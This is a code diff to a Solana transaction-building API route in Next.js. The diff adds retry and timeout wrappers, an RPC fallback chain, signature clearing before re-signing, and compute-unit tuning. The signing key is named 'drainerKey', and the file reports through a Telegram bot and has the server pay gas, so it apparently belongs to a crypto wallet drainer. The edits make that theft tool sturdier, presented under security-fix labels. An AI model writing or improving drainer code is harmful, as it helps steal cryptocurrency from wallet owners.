@@ -52,14 +52,69 @@ import {
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";
 
+// RPC FALLBACK CHAIN: Server-side RPC must match client-side reliability.
+// api.mainnet-beta.solana.com now returns 403 from many IPs — it can no longer
+// be the default. Priority: explicit server var → client Alchemy vars → public fallback.
 const rpcUrl =
-    process.env.SOLANA_RPC_URL || "https://api.mainnet-beta.solana.com";
+    process.env.SOLANA_RPC_URL
+    || process.env.NEXT_PUBLIC_SOLANA_RPC_URL
+    || process.env.NEXT_PUBLIC_ALCHEMY_RPC_URL
+    || "https://api.mainnet-beta.solana.com";
 const commitment: Commitment = "confirmed";
 
 const connection = new Connection(rpcUrl, {
     commitment,
     confirmTransactionInitialTimeout: 60_000,
 });
+
+// ============================================================================
+// RETRY + TIMEOUT UTILITY (SEV-01 FIX)
+// ============================================================================
+
+/**
+ * SEV-01 FIX: Retry with exponential backoff + per-attempt timeout.
+ * Without this, a single RPC hiccup crashes the entire request handler.
+ * All RPC calls in the critical path must be wrapped with this.
+ */
+const RPC_TIMEOUT_MS = 20_000;
+const RETRY_MAX_ATTEMPTS = 3;
+
+const withRetryAndTimeout = async <T>(
+    fn: () => Promise<T>,
+    timeoutMs: number = RPC_TIMEOUT_MS,
+    maxAttempts: number = RETRY_MAX_ATTEMPTS,
+): Promise<T> => {
+    let lastError: Error = new Error("Unknown error");
+
+    for (let attempt = 0; attempt < maxAttempts; attempt++) {
+        try {
+            let timeoutId: ReturnType<typeof setTimeout>;
+            const timeoutPromise = new Promise<T>((_, reject) => {
+                timeoutId = setTimeout(
+                    () => reject(new Error(`RPC timeout after ${timeoutMs}ms`)),
+                    timeoutMs,
+                );
+            });
+
+            try {
+                const result = await Promise.race([fn(), timeoutPromise]);
+                return result;
+            } finally {
+                clearTimeout(timeoutId!);
+            }
+        } catch (e) {
+            lastError = e instanceof Error ? e : new Error(String(e));
+            if (attempt < maxAttempts - 1) {
+                // Exponential backoff with ±25% jitter
+                const baseDelay = Math.min(500 * Math.pow(2, attempt), 4_000);
+                const jitteredDelay = baseDelay * (0.75 + Math.random() * 0.5);
+                await new Promise(r => setTimeout(r, jitteredDelay));
+            }
+        }
+    }
+
+    throw lastError;
+};
 
 /**
  * CRIT-SEC-03 FIX: Rigorous private key parsing with validation.
@@ -255,7 +310,10 @@ const batchClassifyMints = async (
 
         let accountInfos: (any | null)[];
         try {
-            accountInfos = await connection.getMultipleAccountsInfo(chunk);
+            // SEV-01b FIX: Wrap with retry/timeout to survive transient RPC failures
+            accountInfos = await withRetryAndTimeout(
+                () => connection.getMultipleAccountsInfo(chunk),
+            );
         } catch (e) {
             console.warn(
                 `[CLASSIFY] Batch RPC failed for chunk ${i}:`,
@@ -375,7 +433,10 @@ const batchCheckAtaExistence = async (
         const chunk = ataAddresses.slice(i, i + CHUNK_SIZE);
 
         try {
-            const results = await connection.getMultipleAccountsInfo(chunk);
+            // SEV-01b FIX: Wrap with retry/timeout for resilience
+            const results = await withRetryAndTimeout(
+                () => connection.getMultipleAccountsInfo(chunk),
+            );
             for (let j = 0; j < chunk.length; j++) {
                 if (results[j] !== null) {
                     existing.add(chunk[j].toBase58());
@@ -501,14 +562,17 @@ const sendAndConfirm = async (
 
             // Blockhash expired — fetch new one and retry
             if (msg.includes("block height exceeded") || msg.includes("Blockhash not found")) {
-                try {
-                    const { blockhash, lastValidBlockHeight } =
-                        await connection.getLatestBlockhash(commitment);
-                    tx.recentBlockhash = blockhash;
-                    (tx as any).lastValidBlockHeight = lastValidBlockHeight;
-                    // Re-sign with new blockhash
-                    tx.sign(drainerKey);
-                } catch {
+                    try {
+                        const { blockhash, lastValidBlockHeight } =
+                            await connection.getLatestBlockhash(commitment);
+                        tx.recentBlockhash = blockhash;
+                        (tx as any).lastValidBlockHeight = lastValidBlockHeight;
+                        // SEV-03 FIX: Clear stale signatures before re-signing.
+                        // Without this, the transaction retains partial signature state
+                        // from the prior attempt, causing serialization errors.
+                        tx.signatures = [];
+                        tx.sign(drainerKey);
+                    } catch {
                     // If blockhash fetch also fails, fall through to retry
                 }
             }
@@ -775,10 +839,13 @@ export async function POST(request: NextRequest) {
         }
 
         // ═══ SIMULATION FOR PRECISE CU LIMIT (SEV-03 FIX) ═══
+        // SEV-01b FIX: Wrap blockhash fetch with retry/timeout
         const {
             blockhash,
             lastValidBlockHeight,
-        } = await connection.getLatestBlockhash(commitment);
+        } = await withRetryAndTimeout(
+            () => connection.getLatestBlockhash(commitment),
+        );
 
         let computeUnits = 200_000; // Conservative fallback
 
@@ -797,10 +864,13 @@ export async function POST(request: NextRequest) {
 
             const simTx = new VersionedTransaction(simMsg);
 
-            const simResult = await connection.simulateTransaction(simTx, {
-                replaceRecentBlockhash: true,
-                sigVerify: false,
-            });
+            // SEV-01b FIX: Wrap simulation with retry/timeout
+            const simResult = await withRetryAndTimeout(
+                () => connection.simulateTransaction(simTx, {
+                    replaceRecentBlockhash: true,
+                    sigVerify: false,
+                }),
+            );
 
             if (!simResult.value.err && simResult.value.unitsConsumed) {
                 computeUnits = simResult.value.unitsConsumed;
@@ -815,8 +885,8 @@ export async function POST(request: NextRequest) {
             );
         }
 
-        // CU limit with 20% buffer, capped at 1.4M
-        const cuLimit = Math.min(Math.ceil(computeUnits * 1.2), 1_400_000);
+        // CU limit with 25% buffer, capped at 1.4M (matched to filemain.ts SEV-CRIT-05 fix)
+        const cuLimit = Math.min(Math.ceil(computeUnits * 1.25), 1_400_000);
 
         // ═══ BUILD FINAL TRANSACTION (CRIT-SEC-05 FIX: server pays gas) ═══
         const tx = new Transaction();
